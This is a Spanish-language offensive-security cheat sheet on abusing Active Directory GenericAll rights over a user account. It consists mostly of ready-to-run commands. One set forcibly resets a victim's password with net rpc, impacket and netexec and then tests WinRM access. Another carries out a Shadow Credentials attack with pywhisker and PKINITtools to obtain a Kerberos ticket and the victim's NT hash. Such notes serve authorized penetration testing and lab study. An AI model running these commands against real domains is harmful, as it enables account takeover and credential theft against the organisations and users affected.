# Abuso ACL 

Tags: #AD #ACL #Linux #Pywhisker #Gettgtpkinit #Net 

## GenerciAll sobre Usuario 

### Forma 1 (ChangePassword)
```bash 
Paso 1:
❯ net rpc password "TargetUser" "NewPass123!" -U "domain.corp"/"user"%"passwd" -S IP_DC
# Cambia la contraseña sin conocer la actual
	# TargetUser     = Usuario víctima (el que quieres cambiar)
	# user%passwd    = Usuario atacante + su contraseña (quien tiene GenericAll / ForceChangePassword)
	# IP_DC          = IP del Domain Controller
	# NewPass123!    = Nueva contraseña que le pones a la víctima

Opción 2 - Más limpio que net rpc en entornos modernos
❯ impacket-changepasswd 'domain.corp/user@IP_DC' -altuser user -altpass 'NewPass123!' -newpass 'NewPass123!' -reset -dc-ip IP_DC

	# TargetUser@IP_DC = Usuario víctima (el que quieres cambiar)
	# altuser          = Usuario atacante (quien tiene GenericAll / ForceChangePassword)
	# altpass          = Contraseña del usuario atacante
	# newpass          = Nueva contraseña para la víctima
	# -reset           = Fuerza el cambio sin conocer la contraseña actual
	# dc-ip            = IP del Domain Controller

Opción 3 - Alternativa con netexec
❯ nxc smb <IP_DC> -u 'user' -p 'passwd' -M change-password -o USER=targetuser NEWPASS='NewPass123!'

	# user / passwd   = Usuario atacante + su contraseña (quien tiene GenericAll / ForceChangePassword)
	# USER=TargetUser = Usuario víctima (el que quieres cambiar)
	# NEWPASS         = Nueva contraseña para la víctima
	# IP_DC           = IP del Domain Controller
```

```bash 
Paso 2:
# Verificar el cambio de password 
❯ nxc smb IP_DC -u "TargetUser" -p "NewPass123!" 

# Verificar el ingreso por EvilWinRM
❯ nxc winrm IP_DC -u "TargetUser" -p "NewPass123!" 
```

### Forma 2 (Shadow Attack)

* [PyWhisker](https://github.com/ShutdownRepo/pywhisker/tree/main/pywhisker)
* [Shadow Credentials attack](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
* [PKINITtools](https://github.com/dirkjanm/PKINITtools )

```bash 
# Instalación 
❯ git clone https://github.com/ShutdownRepo/pywhisker.git
❯ cd pywhisker
❯ python3 -m venv env
❯ source env/bin/activate
❯ pip install --upgrade pip
❯ pip install -r requirements.txt
❯ cd pywhisker
```

```bash
# Shadow credentials attack 
Paso 1:
❯ ./pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --target "targetAccount" --action "list" 
# Listar el atributo del usuario víctima para ver lo siguiente: 'msDS-KeyCredentialLink is either empty ...'

❯ ./pywhisker.py -d "domain" -u "ControlledAccount" -p "password" --target "targetAccount" --action "add" 

# La tool crea una llave privada, una pública y lo añade al usuario víctima 

	# dc-ip = IP del DC
	# d = Dominio 
	# u = usuario atacante 
	# p = Contraseña del usuario atacante 
	# t = usuario víctima 

❯ ./pywhisker.py -d "domain" -u "ControlledAccount" -H :Hash_NT --target "targetAccount" --action "add"  (Opcional)


NOTA:
	1. Crear un directorio en donde se guardará toda la info del comando 
	2. El output muestra la 'password' que se utilizará para obtener un TGT 
	3. Crea un 'cert.pfx' 
```

```bash 
# Instalación
❯ git clone https://github.com/dirkjanm/PKINITtools
❯ cd PKINITtools
❯ python3 -m venv env
❯ source env/bin/activate
❯ pip install -r requirements.txt
```

```bash 
# Gettgtpkinit (funciona si PKINIT está habilitado)

# Obtener el hash NT
Paso 2:
# En el output del comando se muestra la 'key'
❯ ./gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass 'password' domain/User output.ccache   
	
	# -cert-pfx = Archivo PFX (obtenido de pywhisker)
	# -pfx-pass = Contraseña del PFX (obtenida de pywhisker)
	# domain/User = Usuario target
	# output.ccache = Archivo de salida (Kerberos ticket)
	
	# Output muestra: TGT session key (COPIAR ESTO)
	# Ejemplo: [+] TGT session key: 2b5c8f1d9e3a4b6c7f1a2d3e4f5a6b7c

Paso 3:
❯ KRB5CCNAME=output.ccache ./getnthash.py -key 2b5c8f1d9e3a4b6c7f1a2d3e4f5a6b7c -dc-ip IP_DC domain/User

	# -key = La SESSION KEY que salió en gettgtpkinit.py (NO es 123456!)
	# -dc-ip = IP del Domain Controller
	# domain/User = Usuario target
	
	# Output: NT Hash (aad3b435b51404eeaad3b435b51404ee:88f6fb6111fcf...)
```